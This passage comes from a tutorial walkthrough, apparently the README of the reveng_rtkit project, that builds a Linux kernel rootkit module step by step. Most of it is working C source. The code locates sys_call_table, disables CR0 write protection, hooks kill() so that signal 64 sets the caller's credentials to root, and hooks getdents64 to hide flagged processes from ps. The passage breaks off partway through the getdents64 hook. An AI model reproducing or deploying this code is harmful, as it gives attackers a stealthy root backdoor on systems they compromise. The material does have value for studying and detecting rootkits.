Hooking, in terms of syscall, is to manipulate with the original syscall with our very own malicious syscall, sort of man-in-the-middle attack scenario.<br />
Remember, we made the syscall table <a href="https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#step2-disabling-the-wpwrite-protection-flag-in-the-control-register">editable</a> ‚Äòcause we want to edit original syscall in <code>syscall table</code> with our very own mal. syscall.</p>

<p><strong><em>NOTE</em></strong> :</p>
<pre><code>In programming world, syscall is nothing but a function.
</code></pre>

<p>As soon as we made the <code>sys_call_table</code> unprotected, we would edit that specific syscall in syscall table that we are interested in. We should make a <strong><em>note</em></strong> that as we are overwriting original syscall function with our very own mal. syscall function, the nature of the later must be identical to the prior, otherwise this technique <strong><em>wouldn‚Äôt work</em></strong>.</p>

<p>The name of kill syscall (or sys_kill) in sys_call_table is <strong><em>__NR_kill</em></strong> (offset designated for sys_kill), <a href="https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L87">source</a>.</p>

<p>i) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L42">repo</a><br />
So, let‚Äôs define a custom function type to store original syscall, i.e., <strong><em>__NR_kill</em></strong>.</p>
<pre><code class="language-c">typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
</code></pre>
<p>As I have told you earlier that struct <strong><em>pt_regs</em></strong> is the one which has CPU registers as members of it, which will store passed arguements from usermode, which will eventually be read by syscall, right?<br />
ii) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L45">repo</a><br />
Creating function to store original syscall, i.e., <strong><em>__NR_kill</em></strong>.</p>
<pre><code class="language-c">static tt_syscall orig_kill;
</code></pre>
<p>iii) Let‚Äôs store the original syscall</p>
<pre><code class="language-c">orig_kill = (tt_syscall)__sys_call_table[__NR_kill];
</code></pre>
<p>As, <strong><em>__NR_kill</em></strong> is the name of kill syscall (or, sys_kill) in <strong>syscall table</strong> and the function type of orig_kill is <em><code>tt_syscall</code></em>.<br />
iv) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/9134a4d04bf6c0d347a22503b203bab9098b8eea/kernel_src/reveng_rtkit.c#L311">repo</a>, ignore those lines with <strong>__NR_getdents64</strong> (line no.: 310 and 315). I will explain <strong>__NR_getdents64</strong> seperately after completing this section.</p>

<p>Now, we stored the original syscall, rather backuped the original syscall, as this would be used later to revert back to normal syscall workflow while rmmod‚Äôing our LKM aka. rootkit (in this scenario).<br />
So lets unprotect the memory and edit the syscall table and then revert back the memory protection as it was.</p>
<pre><code class="language-c">orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

unprotect_memory();

__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

protect_memory();
</code></pre>
<p>You might be thinking, what the heck is hacked_kill?<br />
It is actually the function (mal. syscall) that we created, which I will introduce you in the next step.<br />
v) So, now what ?<br />
Remember that? <strong>providing rootshell</strong> portion earlier in this blog (if not, please go and <a href="https://github.com/reveng007/reveng_rtkit/blob/main/Detailed_blog_README.md#part6-providing-rootshell-to-the-attacker">visit</a>, it‚Äôs obvious to forget as this blog is pretty long, don‚Äôt be harsh on yourself! ü§ó)<br />
We will be implementing that <em>getting rootshell</em> mechanism via <em>kill syscall</em>.</p>
<pre><code class="language-c">static void set_root(void)
{
	/*
	 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
	 * 
	 * struct cred {
	 *      ...
	 *      kuid_t          uid;            // real UID of the task
	 *      kgid_t          gid;            // real GID of the task 
	 *      kuid_t          suid;           // saved UID of the task
	 *      kgid_t          sgid;           // saved GID of the task
	 *      kuid_t          euid;           // effective UID of the task
	 *      kgid_t          egid;           // effective GID of the task
	 *      kuid_t          fsuid;          // UID for VFS ops
	 *      kgid_t          fsgid;          // GID for VFS ops
	 *      ...
	 * };
	 * 
	 * ...
	 * extern struct cred *prepare_creds(void);     // returns current credentials of the process
	 * ...
	 * extern int commit_creds(struct cred *);      // For setting modified values of ids to cred structure
	 */

	 struct cred *root = prepare_creds();

	if (root == NULL)
	{
 		return;
	}

	// Updating ids to 0 i.e. root
	root-&gt;uid.val = root-&gt;gid.val = 0;
	root-&gt;euid.val = root-&gt;egid.val = 0;
	root-&gt;suid.val = root-&gt;sgid.val = 0;
	root-&gt;fsuid.val = root-&gt;fsgid.val = 0;

	// Setting the updated value to cred structure
	commit_creds(root);
}


static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	int sig = (int) pt_regs-&gt;si;

	switch (sig)
	{
	case GET_ROOT:
    		printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-&gt; Offering root shell!!");
    		/*
	  		In someway system() function alike kernel function present in linux kernel programming
	  		is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
	  		case) was alloted a root shell, but bash/sh shell did the job.
    		*/
    		set_root();
    		break;
	default:
    		return orig_kill(pt_regs);
	}
	return 0;
}
</code></pre>
<p>If you visit <a href="https://syscalls64.paolostivanin.com/"><ins>Linux Syscall Reference</ins></a>, and search for <em>sys_kill</em> you can see that it depends on 3 registers, <strong>rax</strong> (which contains the syscall id), <strong>rdi</strong> (which contians the file descriptor) and <strong>rsi</strong> (which is the location, where the passed arguments is to be stored).</p>

<p>So here, we are only concerned about <strong>rsi</strong> register as we are interested in the arguments that are passed. We can see that we indeed need <code>int sig</code> to be placed in <strong><em>si</em></strong> register.</p>

<p>So, that means:</p>
<pre><code class="language-c">#define GET_ROOT 64

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	int sig = (int) pt_regs-&gt;si;

	switch (sig)
	{
		case GET_ROOT:
			printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-&gt; Offering root shell!!");
			/*
				In someway system() function alike kernel function present in linux kernel programming
				is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
				case) was alloted a root shell, but bash/sh shell did the job.
			*/
			set_root();
			break;
		default:
			return orig_kill(pt_regs);
	}
	return 0;
}
</code></pre>
<p>line2 :¬† <code>int sig = (int) pt_regs-&gt;si</code> =&gt; Stores the passed argument, in this case it is: <code>64</code>, <a href="https://xcellerator.github.io/posts/linux_rootkits_03/">source</a> (Only the 1st portion before <em>Hooking kill</em>).</p>

<p>Now, if the passed argument/ signal (or sig) is same as <code>GET_ROOT</code> (which is a macro defined) then we are gifted with a <em>rootshell</em>.</p>

<h4 id="now-the-question-comes-why-si-register-why-not-rsi-register">Now the question comes, ‚ÄúWhy <em><code>si</code></em> register, why not <em><code>rsi</code></em> register?‚Äù</h4>
<p><strong><em>Ans</em></strong>: Please follow the <a href="https://github.com/torvalds/linux/blob/15bc20c6af4ceee97a1f90b43c0e386643c071b4/arch/x86/include/asm/ptrace.h#L12">commented lines</a>.</p>

<p>I have told you earlier that the function type of original syscall must be same as the created syscall.</p>
<pre><code>static unsigned long *__sys_call_table;

typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);
static tt_syscall orig_kill;
orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

and

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;
</code></pre>
<p>If you compare all the lines, you will see each function types are satisfying other function types, i.e. there is no function type mismatch. Although, if it doesn‚Äôt match, obviously compiler will through you an error. I just showed this portion to you, as I was dealing with this same problem while creating this project.</p>

<p>vi) So, the whole code to get the rootshell via <code>sys_kill interception</code>:</p>
<pre><code class="language-c">// filename: Test_hook_kill.h

#include &lt;linux/syscalls.h&gt;     /* Needed to use syscall functions */
#include &lt;asm/ptrace.h&gt;		/* For intercepting syscall, struct named pt_regs is needed */

#include &lt;linux/kprobes.h&gt;

// Setting which dynamic kernel symbol to find
static struct kprobe kp = {
	.symbol_name = "kallsyms_lookup_name"
};

// https://xcellerator.github.io/posts/linux_rootkits_03/
#define GET_ROOT 64

/* For storing read cr0 control register value
 *
 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
 *
 * unsigned long (*read_cr0)(void);
 */
unsigned long cr0;

// To store the address of the found sys_call_table
static unsigned long *__sys_call_table;

// Defining a custom function type to store original syscalls
typedef asmlinkage long (*tt_syscall)(const struct pt_regs *);

static tt_syscall orig_kill;

/* For storing address of sys_call_table */

unsigned long *get_syscall_table(void)
{
	unsigned long *syscall_table;

	//Defining custom kallsyms_lookup_name data type named: kallsyms_lookup_name_t, so that kallsyms_lookup_name be exported to kernel (&gt;5.7)
                    
	/* // Lookup the address for a symbol. Returns 0 if not found.
	 * unsigned long kallsyms_lookup_name(const char *name);
	 *
	 */
	typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
                    
	kallsyms_lookup_name_t kallsyms_lookup_name;
	register_kprobe(&amp;kp);
	kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
	unregister_kprobe(&amp;kp);

	syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
	return syscall_table;
}

// ============================= Alloting root privileges ==================

static void set_root(void)
{
	/*
	 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/cred.h
	 *
	 * struct cred {
	 * 	...
	 *	kuid_t		uid;		// real UID of the task
	 *	kgid_t		gid;		// real GID of the task 
	 * 	kuid_t		suid;		// saved UID of the task
	 *	kgid_t		sgid;		// saved GID of the task
	 *	kuid_t		euid;		// effective UID of the task
	 *	kgid_t		egid;		// effective GID of the task
	 *	kuid_t		fsuid;		// UID for VFS ops
	 *	kgid_t		fsgid;		// GID for VFS ops
	 *	...
	 * };
	 *
	 * ...
	 * extern struct cred *prepare_creds(void);	// returns current credentials of the process
	 * ...
	 * extern int commit_creds(struct cred *);	// For setting modified values of ids to cred structure
	 */

	struct cred *root = prepare_creds();

	if (root == NULL)
	{
		return;
	}

	// Updating ids to 0 i.e. root
	root-&gt;uid.val = root-&gt;gid.val = 0;
	root-&gt;euid.val = root-&gt;egid.val = 0;
	root-&gt;suid.val = root-&gt;sgid.val = 0;
	root-&gt;fsuid.val = root-&gt;fsgid.val = 0;

	// Setting the updated value to cred structure
	commit_creds(root);
}

static asmlinkage int hacked_kill(const struct pt_regs *pt_regs)
{
	int sig = (int) pt_regs-&gt;si;
                    
	switch (sig)
	{
		case GET_ROOT:
                        printk(KERN_INFO "[*] reveng_rtkit: From rootkit with love :)\t-&gt; Offering root shell!!");
                        /*
                          In someway system() function alike kernel function present in linux kernel programming
                          is required. in order to execute bash/sh shell then grant root shell as fish shell (in my
                          case) was alloted a root shell, but bash/sh shell did the job.
                        */
                        set_root();
			break;
		default:
                        return orig_kill(pt_regs);
	}
	return 0;
}


static inline void write_cr0_forced(unsigned long val)
{
	unsigned long __force_order;

	asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void)
{
	printk(KERN_INFO "[*] reveng_rtkit: (Memory protected): Regainig normal memory protection\n");
	write_cr0_forced(cr0);	// Setting WP flag to 1 =&gt; read-only
}

static inline void unprotect_memory(void)
{
	pr_info("[*] reveng_rtkit: (Memory unprotected): Ready for editing Syscall Table");
	write_cr0_forced(cr0 &amp; ~0x00010000);	// Setting WP flag to 0 =&gt; writable
}
</code></pre>
<p>Here, the type of this function is <code>asmlinkage int</code>, actually it doesn‚Äôt matter in this context, but it might in others.<br />
Syscalls are of type <code>long</code>, thus, when a user space program such as glibc depends on its return value, it expects a <code>long int</code>, if you feed it with <code>int</code>, things will go very wrong.<br />
Credit: <a href="https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html">jm33.me</a></p>
<pre><code class="language-c">// filename: Test_rtkit_kill.c

#include &lt;linux/init.h&gt;		/* Needed for the macros */
#include &lt;linux/module.h&gt;	/* Needed by all modules */
#include &lt;linux/kernel.h&gt;	/* Needed for printing log level messages */
#include &lt;linux/list.h&gt;		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
#include &lt;linux/cred.h&gt;		/* To change value of this fields we have to invoke prepare_creds(). 
				 * To set those modified values we have to invoke commit_creds(). 
				 * uid, gid and other similar "things" are stored in cred structure which is element of cred structure. */
#include "Test_hook_kill.h"


/* Function Prototypes */

static int      __init rootkit_init(void);
static void     __exit rootkit_exit(void);


// =================== Entry Function ====================

static int __init rootkit_init(void)
{
	printk(KERN_INFO "=================================================\n");
	printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
	printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");

	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
		return -1;

	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);

	/* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
	 *
	 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
	 *
	 * unsigned long (*read_cr0)(void);
	 */
	 cr0 = read_cr0();

	// Storing original syscall
	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

	unprotect_memory();
	
	// Editing syscall table targeting "kill" syscall with our created "hacked_kill".
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();

	return 0;
}

// ========================== Exit Function ====================

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "\n=========================================\n");

	unprotect_memory();
	printk(KERN_INFO "\t\t\t\t\t\t back to normal");

	// Editing the sycall table back to normal, i.e. with original syscall: "kill" syscalls.
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();

	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
	printk(KERN_INFO "=================================================\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("reveng007");
MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
MODULE_VERSION("1.0");
</code></pre>
<p>Now, lets see it in action:<br />
<img src="https://github.com/reveng007/reveng_rtkit/blob/main/img/Blog13.png?raw=true" alt="" /></p>

<p>We can see 3 things:</p>
<ol>
  <li>In <strong><em>fish shell</em></strong>, this mechanism of getting root shell is not working, I don‚Äôt really know why‚Ä¶ (<ins>If any viewers seeing this, have any solution to this problem, please don‚Äôt hesitate to do a PR to my repo but before that please visit, <a href="https://github.com/reveng007/reveng_rtkit#note-1">idea</a></ins>).</li>
  <li>In <strong><em>bash shell</em></strong>, it is working as expected.</li>
  <li>In <strong><em>sh shell</em></strong>, it is working as expected too.</li>
</ol>

<p>B) <strong>getdents64</strong> syscall: <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/syscalls.h#L487">elixir.bootlin</a></p>

<p>I actually wanted to hide ongoing processes and I got that idea for hiding processes from <a href="https://github.com/R3x/linux-rootkits#features-descriptions">source1: R3x/linux-rootkits</a>, but I was unable to understand that portion of code which was linked. I then searched through other <a href="https://github.com/reveng007/reveng_rtkit#resources-that-helped-me">resource links</a> that I had. I found out this: <a href="https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.">source2</a>. I will be implementing this mechanism via <strong>kill syscall</strong> (or sys_kill) as I did earlier.</p>

<p>But here, we are actually intercepting two syscalls simultaneously,</p>
<ol>
  <li><strong><em>kill syscall</em></strong>: To hide pid of any process, cmd: <em><code>kill -32 &lt;pid&gt;</code></em>.</li>
  <li><strong><em>getdents64 syscall</em></strong>: Please go through this <a href="https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.">link</a> (it is the same previous link) and check the last 2 paragraphs of it. It will say that, <code>ps</code> command only just does an ‚Äòls‚Äô on ‚Äú<code>/proc/</code>‚Äù directory.</li>
</ol>

<p>Now then, what is the working machanism of <code>ls</code>?<br />
Visit: <a href="https://gist.github.com/amitsaha/8169242#how-does-ls-do-what-it-does">gist-amitsaha</a>. It says that, after the execution of <code>ls</code>, it in turn invokes the <code>getdents()</code> system call, which is responsible to read the directory contents.<br />
Let‚Äôs check it.</p>
<pre><code class="language-diff">$ strace ls 1&gt;/dev/null 2&gt;/tmp/ls.strace; cat /tmp/ls.strace | cut -d'(' -f1 | sort -u

access
arch_prctl
brk
close
execve
+++ exited with 0 +++
exit_group
+ getdents64    -----&gt; We can see that it performs getdents64 syscall
ioctl
mmap
mprotect
munmap
newfstatat
openat
pread64
prlimit64
read
rt_sigaction
rt_sigprocmask
set_robust_list
set_tid_address
statfs
write
</code></pre>
<p>In that sense, if I perform the same thing with <code>ps</code>, we should be also getting the same <code>getdents()</code> system call.</p>
<pre><code class="language-diff">$ strace ps 1&gt;/dev/null 2&gt;/tmp/ps.strace; cat /tmp/ps.strace | cut -d'(' -f1 | sort -u

access
arch_prctl
brk
close
execve
+++ exited with 0 +++
exit_group
futex
+ getdents64    -----&gt; We can see that it performs the same getdents64 syscall
geteuid
ioctl
lseek
mmap
mprotect
munmap
newfstatat
openat
prctl
pread64
prlimit64
read
rt_sigaction
rt_sigprocmask
set_robust_list
set_tid_address
write
</code></pre>
<p>So, we have to intercept getdents64 syscall.<br />
Let‚Äôs visit the <a href="https://syscalls64.paolostivanin.com/"><ins>Linux Syscall Reference</ins></a>,<br />
Search: <code>sys_getdents64</code>.</p>

<p>Dependent registers:</p>
<pre><code>1. rax: contains syscall ids.
2. rdi: which contains the file descriptor.
3. rsi: which contains the passed arguments.
4. rdx: length of the passed argument(or string).
</code></pre>
<p>In this scenario, we will only need <strong>rdi</strong> and <strong>rsi</strong> register. This is because, we need to know the passed argument (<strong>rsi</strong> register, rather <strong>si</strong> register) and as we will be dealing with files, we will ofcourse be needing the file descriptors (<strong>rdi</strong> register, rather <strong>di</strong> register). (Reason was mentioned earlier in this file)</p>

<p>So, a recap about the Workflow of the machanism:</p>
<ul>
  <li>When we deliver pid of any process via <code>kill -32 &lt;pid&gt;</code>, it will at first find out that particular <code>pid</code> by surfing through ‚Äú<code>/proc/</code>‚Äù directory.</li>
  <li>After getting the <code>pid</code>, it will perform syscall hooking to hide that particular pid and then offering a new process list (excluding the mentioned pid), if the user tries to see running processes using <strong><em>ps</em></strong>.</li>
</ul>

<p>a) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L99">repo</a>.<br />
Finding the process id/ pid:<br />
According to <a href="https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.5.1.">LKM_HACKING</a>:</p>

<pre><code class="language-c">/* Here, -"&amp;gt;" is the html character entities, which really mean: -"&gt;" 
I really don't know, how it happened in that site */

/* get task structure from PID */
struct task_struct *get_task(pid_t pid)
{
	struct task_struct *p = current;
	do {
		if (p-&gt;pid == pid)
			return p;
		p = p-&gt;next_task;
	}
	while (p != current);
	return NULL;
}
</code></pre>
<p>I wasn‚Äôt understanding this portion, but yes I was getting an idea that it is looping to get the process ids. So, I tried for loop.</p>
<pre><code class="language-c">// reveng_rtkit

#include &lt;linux/sched.h&gt;        /* task_struct: Core info about all the tasks */

struct task_struct *find_task(pid_t pid)
{
	struct task_struct *target_process = current;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601
	 * for loop macro
	 * #define for_each_process(p) \
	 * for (p = &amp;init_task ; (p = next_task(p)) != &amp;init_task ; )
	 */
	for_each_process(target_process)
	{
		if (target_process-&gt;pid == pid)
		{
			return target_process;
		}
	}
	return NULL;
}
</code></pre>
<p>This is basically a for loop macro. I got this expression from  <a href="https://github.com/m0nad/Diamorphine/">diamorphine</a> project. Then searched it in <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/sched/signal.h#L601">bootlin</a>.</p>

<p>b) Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/055b7dce57cf1317f13fb3bd141e21c3ec82c5dc/kernel_src/include/hook_syscall_helper.h#L118">repo</a>.<br />
We will now make a function to hide those directories responsible for corresponding <code>pid</code>. Got this portion from <a href="https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#A-b">heroin</a> and <a href="https://github.com/m0nad/Diamorphine/">diamorphine</a> project.</p>

<pre><code class="language-c">/* Here, -"&amp;gt;" : -"&gt;" and "&amp;amp;" : "&amp;" */

#define PF_INVISIBLE 0x10000000
                   
int is_invisible(pid_t pid)
{
	struct task_struct *task;

	if((task = find_task(pid)) == NULL)
		return(0);

	if(task-&amp;gt;flags &amp;amp; PF_INVISIBLE)
		return(1);

	return(0);
}
</code></pre>
<p>I made some changes,</p>
<pre><code class="language-c"> #define PF_INVISIBLE 0x10000000

static int is_invisible(pid_t pid)
{
	struct task_struct *task = find_task(pid);

	if (!pid)
	{
		return 0;
	}

	if (!task)
	{
		return 0;
	}
	if (task-&gt;flags &amp; PF_INVISIBLE)
	{
		return 1;
	}
	return 0;
}
</code></pre>
<p>Visit: <a href="https://github.com/reveng007/reveng_rtkit/blob/4eb75d38eee64a1d804e49220c9cbff092671faf/kernel_src/include/hook_syscall_helper.h#L137">repo</a><br />
Now, comes the last and final part: <strong><em>getdents64</em></strong> syscall interception.</p>

<p>This portion is totally taken from <a href="https://github.com/m0nad/Diamorphine/">diamorphine</a></p>

<ol>
  <li>This is the whole rootkit.c file.</li>
</ol>

<pre><code class="language-c">// Test_rtkit.c

#include &lt;linux/init.h&gt;		/* Needed for the macros */
#include &lt;linux/module.h&gt;	/* Needed by all modules */
#include &lt;linux/kernel.h&gt;	/* Needed for printing log level messages */
#include &lt;linux/list.h&gt;		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
#include &lt;linux/cred.h&gt;		/* To change value of this fields we have to invoke prepare_creds(). 
                            * To set those modified values we have to invoke commit_creds(). 
                            * uid, gid and other similar "things" are stored in cred structure which is element of cred structure. */
#include "Test_hook_getdents64.h"


/* Function Prototypes */

static int      __init rootkit_init(void);
static void     __exit rootkit_exit(void);


// =================== Entry Function ====================

static int __init rootkit_init(void)
{
	printk(KERN_INFO "=================================================\n");
	printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
	printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");

	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
		return -1;
	
	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: 0x%px \n", __sys_call_table);


	/* Executes the instruction to read cr0 register (via inline assembly) and returns the result in a general-purpose register.
	 *
	 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
	 *
	 * unsigned long (*read_cr0)(void);
	 */
	cr0 = read_cr0();

	// Storing original syscall
	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);

	unprotect_memory();

	// Editing syscall table targeting "getdents64" and "kill" syscall with our created "hacked_getdents64" and "hacked_kill".
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	//printk(KERN_EMERG "The value of cr0: %lx\n",cr0);

	protect_memory();

	return 0;

}

// ========================== Exit Function ====================

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "\n=========================================\n");

	unprotect_memory();
	printk(KERN_INFO "\t\t\t\t\t\t back to normal");

	// Editing the sycall table back to normal, i.e. with original syscalls: "getdents64" and "kill" syscalls.
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();

	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
	printk(KERN_INFO "=================================================\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("reveng007");
MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
MODULE_VERSION("1.0");
</code></pre>
<p>This code is same as before (the kill syscall portion), just <code>__NR_getdents64</code> is added (new), <a href="https://elixir.bootlin.com/linux/v5.11/source/arch/arm64/include/asm/unistd32.h#L447">source</a>.</p>

<p>Let us go step by step from <code>Test_hook_getdents64.h</code> file:</p>
<pre><code class="language-c">// Test_hook_getdents64.h

#include &lt;linux/slab.h&gt;         /* kmalloc(), kfree(), kzalloc() */
#include &lt;linux/fdtable.h&gt;      /* Open file table structure: files_struct structure */
#include &lt;linux/proc_ns.h&gt;      /* For `PROC_ROOT_INO` */

// =============================================================================

#include &lt;linux/dirent.h&gt;	/* struct dirent refers to directory entry. */

struct linux_dirent {
    unsigned long   d_ino;	/* inode number */
    unsigned long   d_off;	/* offset to the next dirent */
    unsigned short  d_reclen;	/* length of this record */
    char            d_name[1];	/* filename */
};

static asmlinkage long hacked_getdents64(const struct pt_regs *pt_regs)
{
	/* Dependent registers:
	 * rax: contains syscall ids = 0xd9
	 * rdi: which contains the file descriptor = unsigned int fd
	 * rsi: which contains the passed arguments = struct linux_dirent64 __user *dirent; "__user" =&gt; this pointer resides in user space
	 * rdx: length of the passed argument(or string) = unsigned int count
	 */

    	// Storing file descriptor 
    	int fd = (int) pt_regs-&gt;di;

	/* User space related variable
	* Storing the name of the directory passed from user space via "si" register
	*/
    	struct linux_dirent *dirent = (struct linux_dirent *) pt_regs-&gt;si;

    	int ret = orig_getdents64(pt_regs), err;
	...
</code></pre>
<p><strong>linux/slab.h</strong>: Will be used to allocate memories in ram for directory entries.<br />
<strong>linux/fdtable.h</strong>: For accessing file table structure.<br />
<strong>linux/proc_ns.h</strong>: For using <code>PROC_ROOT_INO</code>. I will explain it, when the time comes.</p>

<p>Now to the next part:</p>
<pre><code class="language-c">	...
	// kernel space related variables
	unsigned short proc = 0;
	unsigned long offset = 0; 
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

	//For storing the directory inode value
	struct inode *d_inode;

	if (ret &lt;= 0)
		return ret;

	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L680
 	 * 
 	 * kzalloc - allocate memory. The memory is set to zero.
 	 * @size: how many bytes of memory are required.
 	 * @flags: the type of memory to allocate (see kmalloc).
 	 *
 	 * static inline void *kzalloc(size_t size, gfp_t flags)
 	 */
	/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/slab.h#L538
	 *
 	 * Below is a brief outline of the most useful GFP flags
 	 * %GFP_KERNEL
 	 *      Allocate normal kernel ram. May sleep.
 	 */
	kdirent = kzalloc(ret, GFP_KERNEL);
	
	if (kdirent == NULL)
		return ret;
   
	// Copying directory name (or pid name) from userspace to kernel space
	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;
		...

	err = copy_to_user(dirent, kdirent, ret);

		if (err)
		{
			goto out;
		}

	out:
		kfree(kdirent);
		return ret;
</code></pre>
<p>Those kernel space and user space variables will mostly be used in <code>copy_from_user</code> and <code>copy_to_user</code> functions as we are going to pass arguments from <em>user space variable</em> to <em>kernel space variable</em> and vice-versa. Being in user space we can‚Äôt read kernel space pointers/variables and vice-versa, that‚Äôs the reason why <code>copy_from_user</code> and <code>copy_to_user</code> functions will be used.<br />
In this scenario, <code>copy_from_user</code> is used to pass the name of the passed <em>directory name</em> to kernel mode variable, <em>kdirent</em> and then we will hide whatever we want to hide and lastly, we will send the output using <code>copy_to_user</code> to the user space variable, <em>dirent</em>.</p>

<p>For the case of <strong><em>kzalloc</em></strong>, <code>GFP_KERNEL</code> is <em>GFP flag</em> which is used for kernel-internal allocations, <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/gfp.h#L245">source: elixir.bootlin</a>.</p>

<p>The last thing, which need explanation is the <ins>error part</ins>. If some error occurs, like sending <ins>wrong</ins> <code>pid</code> number to kernel space, we will free the allocated memory pointed by the kdirent pointer and would return the error which actually occured.</p>

<p>Next part:</p>
<pre><code class="language-c">// Storing the inode value of the required directory(or pid) 
d_inode = current-&gt;files-&gt;fdt-&gt;fd[fd]-&gt;f_path.dentry-&gt;d_inode;

if (d_inode-&gt;i_ino == PROC_ROOT_INO &amp;&amp; !MAJOR(d_inode-&gt;i_rdev)
	/*&amp;&amp; MINOR(d_inode-&gt;i_rdev) == 1*/)
	proc = 1;
	...
</code></pre>
<p>I paraphrased from <a href="https://jm33.me/linux-rootkit-for-fun-and-profit-0x02-lkm-hide-filesprocs.html">jm33.me</a>:<br />
This piece of code checks if current <code>fd</code> points to proc fs, if yes, we say we are <code>ls</code>ing a <code>/proc</code> dir. <code>i_ino</code> is a inode number, representing its index number in linux vfs (virtual filesystem), <code>PROC_ROOT_INO</code> is defined as 1: <a href="https://elixir.bootlin.com/linux/v5.11/source/include/linux/proc_ns.h#L42">elixir.bootlin</a>.</p>
<pre><code class="language-c">/*
 * We always define these enumerators
 */
enum {
	PROC_ROOT_INO		= 1,
	PROC_IPC_INIT_INO	= 0xEFFFFFFFU,
	PROC_UTS_INIT_INO	= 0xEFFFFFFEU,
	PROC_USER_INIT_INO	= 0xEFFFFFFDU,
	PROC_PID_INIT_INO	= 0xEFFFFFFCU,
	PROC_CGROUP_INIT_INO	= 0xEFFFFFFBU,
	PROC_TIME_INIT_INO	= 0xEFFFFFFAU,
};
</code></pre>
<p>That means, if <code>i_ino</code> of any inode is same as <code>PROC_ROOT_INO</code>, its name will be <code>/proc</code>.</p>

<p>The final part of the getdents64 syscall:</p>
<pre><code class="language-c">	// Changes which we will do
	while (offset &lt; ret)
	{
	dir = (void *)kdirent + offset;

	if ((proc &amp;&amp; is_invisible(simple_strtoul(dir-&gt;d_name, NULL, 10))))
	{
		if (dir == kdirent)
		{
			ret -= dir-&gt;d_reclen;
			memmove(dir, (void *)dir + dir-&gt;d_reclen, ret);
